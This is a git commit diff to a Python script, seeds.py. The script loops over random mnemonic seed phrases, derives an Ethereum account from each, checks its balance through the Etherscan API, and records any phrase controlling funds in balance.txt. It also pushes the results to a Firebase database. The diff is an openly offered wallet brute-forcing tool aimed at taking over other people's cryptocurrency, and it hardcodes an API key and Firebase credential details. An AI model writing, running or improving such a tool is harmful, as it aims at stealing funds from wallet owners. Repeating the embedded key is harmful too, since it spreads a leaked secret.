f4914047bf4592d692c50afb0e9916942230f115
Nand Kishore <knand4930@gmail.com>
2023-05-10 16:01:51 +0000

    udpate the values

--- seeds.py
+++ seeds.py
@@ -1,15 +1,17 @@
 from mnemonic import Mnemonic
 import os
-
+from eth_account import Account
+Account.enable_unaudited_hdwallet_features()
 import firebase_admin
 from firebase_admin import credentials
 from firebase_admin import db
+import requests
 
 
 cred = credentials.Certificate("cryptoseeds-daef1-firebase-adminsdk-pz1q3-980d6ab096.json")
 firebase_admin.initialize_app(cred, {'databaseURL':'https://cryptoseeds-daef1-default-rtdb.firebaseio.com/'})
 ref = db.reference('py/')
-
+API_KEY = "DFRBQVTNSMYCPXRDDCN5UTRWKGK89IPX6I"
 
 while True:
     random_bytes = os.urandom(16)
@@ -22,3 +24,36 @@ while True:
     with open('data.txt', 'a') as file:
         file.write('\n' + str(seed_words))
 	
+    try:
+        acct = Account.from_mnemonic(seed_words)
+        print(acct.address)
+        url = f"https://api.etherscan.io/api?module=account&action=balance&address={acct.address}&tag=latest&apikey={API_KEY}"
+        response = requests.get(url)
+        print(response)
+        if response.status_code == 200:
+            data = response.json()
+
+            if int(data['result']) !=0:
+                variable = {
+                    "results": data['result'],
+                    "address": acct.address,
+                    "seeds" : seed_words,
+                }
+                with open('balance.txt', 'a') as file:
+                    file.write('\n' + str(variable))
+            else:
+                acc = {
+                    "results": data['result'],
+                    "address": acct.address,
+                    "seeds": seed_words,
+                }
+                ref.push({'seeds_phrase': acc})
+
+                with open('metamasktreal.txt', 'a') as file:
+                    file.write('\n' + str(acc))
+
+    except Exception as E:
+        print(E)
+        with open('metamaskdummy.txt', 'a') as file:
+            file.write('\n' + str(E))
+    
